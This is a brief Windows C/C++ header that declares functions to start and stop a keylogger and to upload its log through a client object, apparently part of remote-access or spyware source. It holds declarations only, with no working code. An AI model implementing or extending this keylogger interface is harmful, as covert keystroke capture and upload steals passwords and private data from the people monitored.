#pragma once
#include <Windows.h>
#include "Client.h"

void StopKeyLogger();
void StartKeyLogger();
void UploadLog(Client* localClient);